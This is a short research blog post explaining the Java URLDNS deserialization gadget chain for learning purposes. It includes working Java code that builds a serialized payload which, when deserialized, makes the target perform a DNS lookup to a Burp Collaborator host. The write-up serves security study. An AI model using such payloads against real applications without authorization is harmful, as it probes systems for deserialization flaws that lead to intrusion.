---
layout: post
title:  "Analyze Java deserialization gadget chain ( part 2 ) - For learning purpose"
date:   2022-01-21 16:00:00 +0700
categories: research
author: Quang Vo
tags: java, deserialization
description: Research
---

## Introduction
In the previous blog, we have introduced CommonsCollections5 gadget chain, now we going to dive in another gadget chain which is "easier" to understand than the **CommonsCollections5** , it is **URLDNS** gadget chain

## URLDNS gadget chain

From ysoserial, here is how the gadget chain look like:
```
HashMap.readObject()
    HashMap.hash()
      URL.hashCode()
        URLStreamHandler.hashCode()
          URLStreamHandler.getHostAddress()
            InetAddress.getByName()
```

The code to trigger the gadget chain:
```java
    // URL DNS gadget chain
    public static void URLDNSChain()  throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        URL url = new URL("http://pd6qbb5d343bdjpndqhi9a4uslybm0.burpcollaborator.net");
        String fileName = "/home/quangvo1/IdeaProjects/payloadser";
        HashMap<URL, Integer> ht = new HashMap<URL, Integer>();
        ht.put(url, 123);
        Field f1 = URL.class.getDeclaredField("hashCode");
        f1.setAccessible(true);
        f1.set(url, -1);
        serializeObject(ht, fileName);
    }
```
